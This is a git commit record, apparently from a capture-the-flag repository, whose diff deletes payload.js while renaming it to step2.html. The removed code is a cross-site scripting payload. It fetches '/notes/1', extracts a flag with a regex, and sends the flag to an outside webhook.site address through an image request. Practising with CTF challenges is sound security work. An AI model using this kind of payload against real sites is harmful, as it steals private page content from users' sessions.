a60052df3f1cfc06ce995898df76592d5627ea87
Jerrell-Su <68705573+Jerrell-Su@users.noreply.github.com>
2025-05-17 13:21:15 +0800

    Update and rename payload.js to step2.html

--- payload.js
+++
@@ -1,6 +0,0 @@
-(async () => {
-  const r = await fetch('/notes/1');             // flag note
-  const html = await r.text();
-  const flag = /UMC\w+\{[^}]+}/.exec(html)[0];   // simple regex
-  new Image().src = 'https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?f=' + encodeURIComponent(flag);
-})();
